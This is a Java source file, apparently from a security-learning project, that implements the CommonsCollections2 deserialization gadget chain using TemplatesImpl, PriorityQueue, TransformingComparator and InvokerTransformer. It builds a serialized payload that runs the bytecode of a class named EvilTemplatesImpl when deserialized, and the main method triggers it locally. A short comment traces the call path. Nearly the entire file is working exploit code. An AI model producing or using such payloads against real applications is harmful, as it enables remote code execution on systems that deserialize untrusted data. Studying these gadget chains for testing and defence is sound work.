package com.govuln.deserialization;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2TemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    /**
     * PriorityQueue#readObject()
     * PriorityQueue#heapify()
     * PriorityQueue#siftDown()
     * PriorityQueue#siftDownUsingComparator()
     *      TransformingComparator#compare(obj1,obj2)
     *          InvokerTransformer#transform(obj1) === newTransformer.invoke(templatesImpl)
     */


    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        // 把obj放入queue中，obj就会传递给transformer.transform。这样就可以不用使用Transformer数组。
        // TransformingComparator.compare(obj1,obj2)-->transformer.transform(obj1),transformer.transform(obj2)
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
